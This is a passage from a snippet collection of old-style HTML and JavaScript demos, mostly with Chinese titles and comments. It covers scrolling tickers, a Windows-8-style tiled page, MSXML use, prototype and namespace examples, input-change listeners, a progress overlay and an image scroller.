			this.NextButton = this.$(btnNext);
			this.NextButton.onclick = this.GetFunction(this,"Next");
			this.NextButton.onmouseover = this.GetFunction(this,"Stop");
			this.NextButton.onmouseout = this.GetFunction(this,"Start");
		}
		if(btnPrevious)
		{
			this.PreviousButton = this.$(btnPrevious);
			this.PreviousButton.onclick = this.GetFunction(this,"Previous");
			this.PreviousButton.onmouseover = this.GetFunction(this,"Stop");
			this.PreviousButton.onmouseout = this.GetFunction(this,"Start");
		}
		this.ScrollContent.onmouseover = this.GetFunction(this,"Stop");
		this.ScrollContent.onmouseout = this.GetFunction(this,"Start");
		if(autoStart)
		{
			this.Start();
		}
	}

	ScrollText.prototype.$ = function(element)
	{
		return document.getElementById(element);
	}

	ScrollText.prototype.Previous = function()
	{
		clearTimeout(this.AutoScrollTimer);
		clearTimeout(this.ScrollTimer);
		this.Scroll("up");
	}

	ScrollText.prototype.Next = function()
	{
		clearTimeout(this.AutoScrollTimer);
		clearTimeout(this.ScrollTimer);
		this.Scroll("down");
	}

	ScrollText.prototype.Start = function()
	{
		clearTimeout(this.AutoScrollTimer);
		this.AutoScrollTimer = setTimeout(this.GetFunction(this,"AutoScroll"), this.Timeout);
	}

	ScrollText.prototype.Stop = function()
	{
		clearTimeout(this.ScrollTimer);
		clearTimeout(this.AutoScrollTimer);
	}

	ScrollText.prototype.AutoScroll = function()
	{
		if(this.Direction == "up")
		{
			if(parseInt(this.ScrollContent.scrollTop) >= parseInt(this.ScrollContent.scrollHeight) / 2)
			{
				this.ScrollContent.scrollTop = 0;
			}
			this.ScrollContent.scrollTop += this.Amount;
		}
		else
		{
			if(parseInt(this.ScrollContent.scrollTop) <= 0)
			{
				this.ScrollContent.scrollTop = parseInt(this.ScrollContent.scrollHeight) / 2;
			}
			this.ScrollContent.scrollTop -= this.Amount;
		}
		if(parseInt(this.ScrollContent.scrollTop) % this.LineHeight != 0)
		{
			this.ScrollTimer = setTimeout(this.GetFunction(this,"AutoScroll"), this.Delay);
		}
		else
		{
			this.AutoScrollTimer = setTimeout(this.GetFunction(this,"AutoScroll"), this.Timeout);
		}
	}

	ScrollText.prototype.Scroll = function(direction)
	{
		if(direction=="up")
		{
			if(this.ScrollContent.scrollTop == 0)
			{
				this.ScrollContent.scrollTop = parseInt(this.ScrollContent.scrollHeight) / 2;
			}
			this.ScrollContent.scrollTop -= this.Amount;
		}
		else
		{
			this.ScrollContent.scrollTop += this.Amount;
		}
		if(parseInt(this.ScrollContent.scrollTop) >= parseInt(this.ScrollContent.scrollHeight) / 2)
			{
				this.ScrollContent.scrollTop = 0;
			}
		if(parseInt(this.ScrollContent.scrollTop) % this.LineHeight != 0)
		{
			this.ScrollTimer = setTimeout(this.GetFunction(this,"Scroll",direction), this.Delay);
		}
	}

	ScrollText.prototype.GetFunction = function(variable,method,param)
	{
		return function()
		{
			variable[method](param);
		}
	}

	//-->
</script>
  
  
  
      <style type="text/css">
          .title{height:28px;width:150px;line-height:28px;text-align:center;border-bottom:solid 1px #888888;background-color:#EEEEEE;}
          .fleft{float:left;margin-left:20px;font-size:12px;}
          .listscroll{border:solid 1px #888888;width:150px;text-align:left;}
          #listdown,#listmarquee,#listcontent{height:179px;width:150px;overflow:hidden;}
          .listpro{height:59px;width:130px;line-height:20px;overflow:hidden;border-bottom:dashed 1px #AAAAAA;margin-left:10px;}
          .remark{margin-top:10px;line-height:18px;}
      </style>
      <script language="javascript" type="text/javascript">
      window.onload = function()
      {
          var scrollup = new ScrollText("listcontent");
          scrollup.LineHeight = 60;
          scrollup.Amount = 4;
          scrollup.Start();
          
          var marquee = new ScrollText("listmarquee");
          marquee.LineHeight = 60;
          marquee.Amount = 1;
          marquee.Timeout = 30;
          marquee.Delay = 30;
          marquee.Start();
          
          var scrolldown = new ScrollText("listdown");
          scrolldown.LineHeight = 60;
          scrolldown.Amount = 4;
          scrolldown.Direction = "down";
          scrolldown.Start();
          
      }
      </script>
  </head>
  <body>
  <div class="fleft">
  <div class="listscroll">
      <div class="title">最新产品</div>
      <div id="listcontent">
          <div class="listpro">
              名称:最新商品1<br />
              描述:最新商品1到货了.<br />
              价格:￥999.99
          </div>
          <div class="listpro">
              名称:最新商品2<br />
              描述:最新商品2到货了.<br />
              价格:￥999.99
          </div>
          <div class="listpro">
              名称:最新商品3<br />
              描述:最新商品3到货了.<br />
              价格:￥999.99
          </div>
          <div class="listpro">
              名称:最新商品4<br />
              描述:最新商品4到货了.<br />
              价格:￥999.99
          </div>
      </div>
  </div>
  <div class="remark">
  向上滚动<br />
  var scrollup = new ScrollText("listcontent");<br />
  scrollup.LineHeight = 60;<br />
  scrollup.Amount = 4;<br />
  scrollup.Start();<br />
  </div>
  </div>
  <div class="fleft">
  <div class="listscroll">
      <div class="title">最新产品</div>
      <div id="listmarquee">
          <div class="listpro">
              名称:最新商品1<br />
              描述:最新商品1到货了.<br />
              价格:￥999.99
          </div>
          <div class="listpro">
              名称:最新商品2<br />
              描述:最新商品2到货了.<br />
              价格:￥999.99
          </div>
          <div class="listpro">
              名称:最新商品3<br />
              描述:最新商品3到货了.<br />
              价格:￥999.99
          </div>
          <div class="listpro">
              名称:最新商品4<br />
              描述:最新商品4到货了.<br />
              价格:￥999.99
          </div>
      </div>
  </div>
  <div class="remark">
  也可以当成marquee<br />
  var marquee = new ScrollText("listmarquee");<br />
  marquee.LineHeight = 60;<br />
  marquee.Amount = 1;<br />
  marquee.Timeout = 30;<br />
  marquee.Delay = 30;<br />
  marquee.Start();<br />
  </div>
  </div>
  <div class="fleft">
  <div class="listscroll">
      <div class="title">最新产品</div>
      <div id="listdown">
          <div class="listpro">
              名称:最新商品1<br />
              描述:最新商品1到货了.<br />
              价格:￥999.99
          </div>
          <div class="listpro">
              名称:最新商品2<br />
              描述:最新商品2到货了.<br />
              价格:￥999.99
          </div>
          <div class="listpro">
              名称:最新商品3<br />
              描述:最新商品3到货了.<br />
              价格:￥999.99
          </div>
          <div class="listpro">
              名称:最新商品4<br />
              描述:最新商品4到货了.<br />
              价格:￥999.99
          </div>
      </div>
  </div>
  <div class="remark">
  向下滚动<br />
  var scrolldown = new ScrollText("listcontent");<br />
  scrolldown.LineHeight = 60;<br />
  scrolldown.Amount = 4;<br />
  scrolldown.Direction = "down";<br />
  scrolldown.Start();<br />
  </div>
  </div>
  </body>
  </html>
  
#T=Metro Win8 UI
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8"/>
	<link rel="stylesheet" type="text/css" href="css/style.css"/>
	<script type="text/javascript" src="js/jquery-1.6.1.min.js"></script>
	<script type="text/javascript" src="js/jquery.animation.easing.js"></script>
	<script type="text/javascript" src="js/jquery.mousewheel.min.js"></script>
	<script type="text/javascript" src="js/source.js"></script>
	<script type="text/javascript" src="js/script.js"></script>
	<title>仿WP界面三屏切换示例</title>
	<base target="_blank">
</head>
<body>
	<div id="place">
		<div id="name1">
		</div>
		<div id="wrapper1">
			<div class="site" id="thumb1-1">
			</div>
			<div class="site" id="thumb1-2">
			</div>
			<div class="site" id="thumb1-3">
			</div>
			<div class="site" id="thumb1-4">
			</div>
			<div class="site" id="thumb1-5">
			</div>
			<div class="site" id="thumb1-6">
			</div>
			<div class="site" id="thumb1-7">
			</div>
			<div class="site" id="thumb1-8">
			</div>
			<div class="site" id="thumb1-9">
			</div>
			<div class="site" id="thumb1-10">
			</div>
			<div class="site" id="thumb1-11">
			</div>
			<form action="" method="get">
			<input type="text" name="q" value="" />
			<button type="submit">
			</button>
			<div id="search-engine">
			</div>
			<div id="engines">
				<div id="google">
				</div>
				<div id="bing">
				</div>
				<div id="yahoo">
				</div>
				<div id="baidu">
				</div>
			</div>
			</form>
		</div>
		<!-- end wrapper1 -->
		<div id="button1to2">
		</div>
		<div id="button2to1">
		</div>
		<div id="name2">
		</div>
		<div id="wrapper2">
			<div class="site" id="thumb2-1">
			</div>
			<div class="site" id="thumb2-2">
			</div>
			<div class="site" id="thumb2-3">
			</div>
			<div class="site" id="thumb2-4">
			</div>
			<div class="site" id="thumb2-5">
			</div>
			<div class="site" id="thumb2-6">
			</div>
			<div class="site" id="thumb2-7">
				<table width="310" height="468" border="0" cellpadding="0" cellspacing="0" background="img/pricing_tables.png">
					<tr>
						<td height="68px" colspan="2">
							&nbsp;
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/337369.htm">Eclipse 和 Equinox 4.2 RC1发布</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/337196.htm">Bonita 5.6.3发布 协同工作流引擎</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/337151.htm">Apache Tomcat Connectors
								1.2.36发布</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/337137.htm">IntelliJ IDEA 11.1.2 发布</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/335417.htm">Errai 2.0发布 异步消息传递框架</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/335413.htm">JFile 1.0.0 RC2发布</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/335020.htm">Disruptor 2.9发布 并发编程框架</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201204/332439.htm">JavaFX 2.1正式版发布</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201204/331406.htm">Clojure 1.4发布 并发编程语言</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201204/329084.htm">W3C发布CSS Variables首个公开草案</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201204/329068.htm">Lucene 3.6发布 Java全文搜索引擎</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201204/326782.htm">MyEclipse 10.1发布 企业级开发工具</a>
						</td>
					</tr>
				</table>
			</div>
			<div class="site" id="thumb2-8">
				<table width="310" height="468" border="0" cellpadding="0" cellspacing="0" background="img/pricing_tables2.png">
					<tr>
						<td height="68" colspan="2">
							&nbsp;
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201204/327050.htm">仰观Java时代淘宝的技术发展</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201204/331095.htm" target="_blank">阿里巴巴离职DBA
								35岁总结的职业生涯</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/335102.htm" target="_blank">&quot;菜鸟&quot;程序员和&quot;大神&quot;程序员差距</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201201/311187.htm" target="_blank">十种可能改变IT行业走向的编程语言</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201202/319101.htm" target="_blank">有可能挑战Java优势的四种技术</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201204/330124.htm" target="_blank">Java学习之路：不走弯路，就是捷径</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201203/324867.htm" target="_blank">Java优势依然
								甲骨文更爆十年规划</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201203/326424.htm" target="_blank">最喜欢与最讨厌的编程语言</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/334350.htm" target="_blank">Phil Katz短暂而饱受折磨的一生</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201204/329096.htm" target="_blank">张利华：夺命的中国IT互联网行业</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/334288.htm" target="_blank">爱的Python，你为何如此丑陋</a>
						</td>
					</tr>
					<tr>
						<td>
							&nbsp;
						</td>
						<td>
							<a href="http://developer.51cto.com/art/201205/337301.htm" target="_blank">给明年依然年轻的我们:道别150万年薪</a>
						</td>
					</tr>
				</table>
			</div>
		</div>
		<!-- end wrapper2 -->
		<div id="button2to3">
		</div>
		<div id="button3to2">
		</div>
		<div id="name3">
		</div>
		<div id="wrapper3">
			<div class="site" id="thumb3-1">
				<iframe width="100%" height="500" frameborder="0" scrolling="no" src="http://widget.weibo.com/livestream/listlive.php?language=zh_cn&width=0&height=500&uid=1734475394&skin=1&refer=1&appkey=&pic=0&titlebar=1&border=1&publish=1&atalk=1&recomm=0&at=0&atopic=%E4%BB%A3%E7%A0%81%E5%B7%A5%E5%85%B7&ptopic=%E4%BB%A3%E7%A0%81%E5%B7%A5%E5%85%B7&dpc=1">
				</iframe>
			</div>
		</div>
		<!-- end wrapper3 -->
	</div>
	<!-- end place -->
	<!--
<script src="http://logs.51cto.com/rizhi/count/count.js"></script>
<script src="http://logs.51cto.com/rizhi/count/analytic.js"></script>
</body>
<!-- JiaThis Button BEGIN -->
<script type="text/javascript" src="http://v1.jiathis.com/code/jiathis_r.js?move=0&amp;uid=1514104" charset="utf-8"></script>
<!-- JiaThis Button END -->
</html>

#T=msxml
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
</head>
<body>
<!-- data.html -->
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">
</head>
	<body>
		<textarea id="ta" rows="10" cols="10"></textarea>
		<script language="javascript"> 
			// Load XML 
			var xmlDom = new ActiveXObject("Microsoft.XMLDOM");
			xmlDom.async = false;
			xmlDom.loadXML("<root></root>");
			var s = xmlDom.xml;
			var root = xmlDom.documentElement;
			var e = xmlDom.createElement("NEW");
			e.text = "sadsad";
			root.appendChild(e);
			var s = xmlDom.xml;
			//document.write(s);
			document.getElementById("ta").value = s;
		</script> 
	</body>
</html>
</body>
</html>

#T=namespace javasctipt
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
<title> new document </title>
<meta name="generator" content="editplus" />
<meta name="author" content="" />
<meta name="keywords" content="" />
<meta name="description" content="" />
</head>
<body>
<script type="text/javascript">
	<!--
	var Microshaoft = {};
	Microshaoft.derp = function()
						{ 
							alert("one");
						}
	function derp()
	{
		alert("two");
	}
	Microshaoft.derp();
	//-->
</script>
</body>
</html>

#T=oninput & onpropertychange 实时监听输入框值变化的完美方案
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
	<title> new document </title>
	<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
	<META NAME="Author" CONTENT="EditPlus,Microshaoft">
	<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
	<META NAME="Description" CONTENT="EditPlus,Microshaoft">

	<script type="text/javascript">
	// Firefox, Google Chrome, Opera, Safari, Internet Explorer from version 9
		function OnInput (event) {
			alert ("The new content: " + event.target.value);
		}
	// Internet Explorer
		function OnPropChanged (event) {
			if (event.propertyName.toLowerCase () == "value") {
				alert ("The new content: " + event.srcElement.value);
			}
		} 
	</script>
</head>
<body>
	Please modify the contents of the text field.
	<input type="text" oninput="OnInput (event)" onpropertychange="OnPropChanged (event)" value="Text field" />
</body>


</html>

#T=Progress Indicator
<html>
	<head>
	<title>ProgressIndicator Demo</title>
	<script type="text/javascript">
	<!--
		var ProgressIndicator = {
		isShow  :   false,
		height  :   100,
		width   :   300,
		target  :   self,
		spinner	:   "../images/spinner.gif",
		show	:   function(width,height,target)
		{
			if(this.isShow==false)
			{
				if(arguments.length >= 2)
				{
					this.width = width;
					this.height = height;
					if(arguments.length>2)
					{
						this.target = target;
					}
				}
				var size = this.getMaskSize();
				this.target.document.body.insertAdjacentHTML("beforeEnd","<div id=\"maskskin\" style=\"position:absolute;left:0px;top:0px;background-color:#333333;opacity: .4;filter: alpha(opacity=40);z-index:1000;width:"+size.width+"px;height:"+size.height+"px;\"></div>");
				var position = this.getCenterPosition();
				this.target.document.body.insertAdjacentHTML("beforeEnd","<IFRAME name=\"masklayer\" style=\"border:1px solid buttontext;position:absolute;z-index:1001;left:"+position.left+"px;top:"+position.top+"px;\" frameborder=0 width=\""+this.width+"\" height=\""+this.height+"\" src=\"about:blank\"/>");
				var frameDoc = this.target.document.frames["masklayer"].document;
				frameDoc.open();
				frameDoc.write("<table width=\"100%\" height=\"100%\"><tr><td><img src=\""+this.spinner+"\"></td><td style=\"color:black;font-size:10pt;\"><b>Waiting...</b></td></tr><tr><td></td><td style=\"color:black;font-size:10pt;\">Be patient,processing...</td></tr></table>");
				frameDoc.close();
				this.isShow = true;
				this.addEvent(this.target, "resize", ProgressIndicator.centerProgressBar);	  
				this.addEvent(this.target, "scroll", ProgressIndicator.centerProgressBar);
			}
			//window.onscroll = this.centerProgressBar;
		},
		hide	:   function()
		{
			var maskFrame = this.target.document.getElementById("masklayer");
			maskFrame.parentNode.removeChild(maskFrame);
			var maskSkin = this.target.document.getElementById("maskskin");
			maskSkin.parentNode.removeChild(maskSkin);
			this.isShow = false;
			this.removeEvent(this.target, "resize", ProgressIndicator.centerProgressBar);	
			this.removeEvent(this.target, "scroll", ProgressIndicator.centerProgressBar);
		},
		updateMessage  :   function(msg)
		{
			if(this.isShow)
			{
				var table = this.target.document.frames["masklayer"].document.getElementsByTagName("TABLE")[0];
				table.rows[1].cells[1].innerHTML = msg;
			}
		},
		addEvent : function(obj, evType, fn){
					 if (obj.addEventListener){
						obj.addEventListener(evType, fn, false);
						return true;
					 } else if (obj.attachEvent){
						var r = obj.attachEvent("on"+evType, fn);
						return r;
					 } else {
						return false;
					 }
					},
		 removeEvent : function(obj, evType, fn, useCapture){
						  if (obj.removeEventListener){
							obj.removeEventListener(evType, fn, useCapture);
							return true;
						  } else if (obj.detachEvent){
							var r = obj.detachEvent("on"+evType, fn);
							return r;
						  } else {
							alert("Handler could not be removed");
						  }
						},
		 getViewportHeight : function() {
								if (this.target.innerHeight!=this.target.undefined) return this.target.innerHeight;
								if (this.target.document.compatMode=='CSS1Compat') return this.target.document.documentElement.clientHeight;
								if (this.target.document.body) return this.target.document.body.clientHeight; 

								return this.target.undefined; 
							},
		 getViewportWidth : function(){
								var offset = 17;
								var width = null;
								if (this.target.innerWidth!=this.target.undefined) return this.target.innerWidth; 
								if (this.target.document.compatMode=='CSS1Compat') return this.target.document.documentElement.clientWidth; 
								if (this.target.document.body) return this.target.document.body.clientWidth; 
							},
		 getScrollTop : function(){
							if (self.pageYOffset) // all except Explorer
							{
								return self.pageYOffset;
							}
							else if (this.target.document.documentElement && this.target.document.documentElement.scrollTop)
								// Explorer 6 Strict
							{
								return this.target.document.documentElement.scrollTop;
							}
							else if (this.target.document.body) // all other Explorers
							{
								return this.target.document.body.scrollTop;
							}
						},
		 getScrollLeft : function(){
								if (self.pageXOffset) // all except Explorer
								{
									return self.pageXOffset;
								}
								else if (this.target.document.documentElement && this.target.document.documentElement.scrollLeft)
									// Explorer 6 Strict
								{
									return this.target.document.documentElement.scrollLeft;
								}
								else if (this.target.document.body) // all other Explorers
								{
									return this.target.document.body.scrollLeft;
								}
							},
		 getMaskSize	:   function()
							{			
								var theBody = this.target.document.getElementsByTagName("BODY")[0];
										
								var fullHeight = this.getViewportHeight();
								var fullWidth = this.getViewportWidth();
								
								// Determine what's bigger, scrollHeight or fullHeight / width
								if (fullHeight > theBody.scrollHeight) {
									popHeight = fullHeight;
								} else {
									popHeight = theBody.scrollHeight;
								}
								
								if (fullWidth > theBody.scrollWidth) {
									popWidth = fullWidth;
								} else {
									popWidth = theBody.scrollWidth;
								}
								
								return {width:popWidth,height:popHeight+this.height};
							},
		 getCenterPosition  :   function()
								 {
									//var theBody = document.documentElement;
									var theBody = this.target.document.getElementsByTagName("BODY")[0];
									//theBody.style.overflow = "hidden";
									var scTop = parseInt(this.getScrollTop(),10);
									var scLeft = parseInt(theBody.scrollLeft,10);
									
									var fullHeight = this.getViewportHeight();
									var fullWidth = this.getViewportWidth();
									
									var top = scTop + ((fullHeight - this.height) / 2);
									var left = scLeft + ((fullWidth - this.width) / 2);
									
									return {top:top,left:left};
								 },
		 centerProgressBar  :   function()
								 {
									if(ProgressIndicator.isShow)
									{
										var position = ProgressIndicator.getCenterPosition();
										var maskdiv = ProgressIndicator.target.document.getElementsByName("masklayer")[0];
										maskdiv.style.top = position.top + "px";
										maskdiv.style.left = position.left + "px";
									}
								 }			 
	};
	//-->
	</script>
	<script language="javascript" type="text/javascript">
	<!--

	ProgressIndicator.spinner = "spinner.gif";

	//-->
	</script>
	</head>
<body>
<h2>ProgressIndicator Demo</h2>
<hr/>
<input type="button" value="Show ProgressIndicator..." onclick="ProgressIndicator.show()"><br/><br/>
<input type="button" value="Show ProgressIndicator...[400,150]" onclick="ProgressIndicator.show(400,150,top)">
</body>
</html>
#T=prototype
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
<title> new document </title>
<meta name="generator" content="editplus" />
<meta name="author" content="" />
<meta name="keywords" content="" />
<meta name="description" content="" />
</head>
<body>
<script type="text/javascript">
	<!--
	var derp; // will hold a Herp instance
	var Herp = function()
		{
			this.opinion = "Javascript is cooler than BASIC.";
		}
	Herp.prototype.speak = function()
							{
								alert(this.opinion);
							}
	var derp= new Herp();
	derp.speak();
	//-->
</script>
</body>
</html>

#T=replace
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="Generator" content="EditPlus?,Microshaoft?">
	<meta name="Author" content="EditPlus?,Microshaoft?">
	<meta name="Keywords" content="EditPlus?,Microshaoft?">
	<meta name="Description" content="EditPlus?,Microshaoft?">
	<title>Document</title>
</head>
<body>
<script type="text/javascript">
<!--
	var s = "asdasd";
	//var r = s.replaceAll("asd","xyz");
	//alert(r);
	var r = "asdasd".replaceAll("asd","xyz");
	alert(r);
	r = "asdasd".replace(/asd/g,"xyz");
	alert(r);

	var x = "hi";
	var func = function() {
		alert(x);
		//var x = "hi1";
		x = "hi1";
	}
	func();
	alert(x);
//-->
</script>
</body>
</html>

#T=Scroll Images
<html><head>
<meta http-equiv='Content-Type' content='text/html; charset=gb2312'>
<script language='JavaScript'>
var scrollerheight=160;                                                //定义每个区域显示的高度
var html,total_area=0,wait_flag=true;      //初始化html串,总显示区域数,是否等待.
var bMouseOver = 1;                                            //鼠标放上去就不滚动了,这里硬编码为true
var scrollspeed = 5;                                                     //滚动速度,其实是每次向上移动的象素数,值越大看起来越快
var waitingtime = 5000;                                         //每次翻动的等待时间，单位毫秒
var s_tmp = 0                                                                             //初始移动次数
var s_amount = 32;                                                      //它的值是由每次需要移动的象素除以scrollspeed换算出来的
var scroll_content=new Array();                     //声明一个数组
var startPanel=0, n_panel=0, i=0;           //声明初始区域,区域个数和循环变量
 
//********************************************
//这是我做的一个跟踪变量函数
//在需要使用跟踪变量的地方直接调用trace()函数就可以了.
var newwin;
var isDebug = 1;
function trace(s)
{
       if(isDebug)
       {
              try
              {
                     newwin.document.write(s + "<BR>");
              }
              catch(e)
              {
                     newwin = window.open("","trace");
                     newwin.document.write(s + "<BR>");
              }
       }      
}
//**********************************************
//初始化滚动函数
function startscroll(){
       
       //随机获取初始区域
       //startPanel是0到scroll_content下标的任意数
       i=0;
       for(i in scroll_content)n_panel++;
       n_panel = n_panel -1;
       startPanel = Math.round(Math.random()*n_panel);
 
       //如果初始区域是第一个元素,
       //调用insert_area把scroll_content里所有元素都装到DIV里
       if(startPanel == 0) 
       {
              i=0;
              for(i in scroll_content)
                     insert_area(total_area, total_area++); 
       }
       else 
              //如果初始区域是最后一个元素
              //先把最后一个装进DIV,然后依次把其它元素装进DIY
              if(startPanel == n_panel) //如果是最后一个元素
              {
                     insert_area(startPanel, total_area);
                     total_area++;
                     for(i=0; i<startPanel; i++)
                     {
                            insert_area(i,total_area);
                            total_area++;
                     }
              }
       else
              //如果初始区域不是第一个，也不是最后一个
              //先把当前区域装进DIV,
              //然后再把当前区域之前和之后的区域装进DIV
              if((startPanel > 0) || (startPanel < n_panel)) 
              {
                     insert_area(startPanel,total_area);
                     total_area++;
                     for(i=startPanel+1; i<=n_panel; i++)
                     {
                            insert_area(i,total_area);
                            total_area++;
                     }
                     for(i=0; i<startPanel; i++)
                     {
                            insert_area(i,total_area);
                            total_area++;
                     }
              }
       //每隔waitingtime的时间调用一次scrolling()函数
       window.setTimeout('scrolling()',waitingtime);
}
 
 
//滚动函数
function scrolling()
{
       //判断鼠标是否放上去,并且是否在等待
       if(bMouseOver && wait_flag) 
       {
              trace("----------------------------");
              for(i=0;i<total_area;i++)
              {
                     //每次所有区域同意向上移动scrollspeed个象素
                     tmp = document.getElementById('scroll_area'+i).style;
                     tmp.top = parseInt(tmp.top) - scrollspeed;  
                     
                     if(i==0)trace("第一个区域的顶部"+parseInt(tmp.top));
                     //如果从屏幕种移出1个区域的话,被移出的区域从底部出现
                     if (parseInt(tmp.top) <= -scrollerheight) 
                     {
                            tmp.top = scrollerheight*(total_area-1);
                     }
                     
                     trace("移动次数:"+s_tmp);
                     //s_tmp是向上移动的次数,按理说应该移动到正好要移动的象素就该停止了
                     //因为一次向上移动scrollspeed个象素,本例子中一次翻动要移动的象素就是scrollerheight
                     //当然你也可以一次翻动两个scrollerheight
                     //所以要移动scrollerheight/scrollspeed次,s_amount就是这样算出来的.               
                     //因为s_tmp是从0初始化的,所以减去1后才是真正一次翻动要移动的次数
                     //但是呢,因为执行一次scrolling()函数,s_tmp就会增加scroll_content.length多次,
                     //所以移动的次数应当是(s_amount-1)*scroll_content.length),
                     //当翻动次数大于我们算出来的值的时候就要停止,也就是把向上移动的必要条件去调
                     //这从跟踪变量的输出可以看出来
                     if(s_tmp++ > (s_amount-1)*scroll_content.length) 
                     {
                            trace("(s_amount-1)*scroll_content.length="+(s_amount-1)*scroll_content.length)
                            wait_flag=false;//进入等待
                            //等待waitingtime,再消除等待,并且吧s_tmp归零.
                            window.setTimeout('wait_flag=true;s_tmp=0;',waitingtime);
                     }
              }
       }
       //设置1秒钟执行1000次本函数
       window.setTimeout('scrolling()',1);
}
 
function insert_area(idx, n)
{
html='<div style="left: 0px; width: 100%; position: absolute; top: '+(scrollerheight*n)+'px" id="scroll_area'+n+'">';
html+=scroll_content[idx]+'';html+='</div>';document.write(html);
}
//下面的部分可以由asp循环生成
 
scroll_content[0] = '<table height=140 align=center border=0 width=300 id=0><tr><td><a href=# target=_blank><IMG SRC=http://www.google.cn/intl/zh-CN_cn/images/logo.gif width=307 height=140 border=0></a></td></tr></table>';
scroll_content[1] = '<table height=140 align=center border=0 width=300 id=1><tr><td><a href=# target=_blank><IMG SRC=http://www.google.cn/intl/zh-CN_cn/images/logo.gif width=307 height=140 border=0></a></td></tr></table>';
scroll_content[2] = '<table height=140 align=center border=0 width=300 id=2><tr><td><a href=# target=_blank><IMG SRC=http://www.google.cn/intl/zh-CN_cn/images/logo.gif width=307 height=140 border=0></a></td></tr></table>';
startscroll();</script>

#T=setTimeout和setIntreval函数添加回调参数
<!doctype html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="Generator" content="EditPlus?,Microshaoft?">
	<meta name="Author" content="EditPlus?,Microshaoft?">
	<meta name="Keywords" content="EditPlus?,Microshaoft?">
	<meta name="Description" content="EditPlus?,Microshaoft?">
	<title>Document</title>
<script type="text/javascript">
<!--
	//var isIE = navigator.userAgent.match(/MSIE (\d+)/i)[0];
	//if(isIE < 10)
	{
		//计时器方法回调参数兼容
		(function() {
			var i, s = ["setTimeout", "setInterval"];
			for(i = 0; i < s.length; i++)(function(name) {
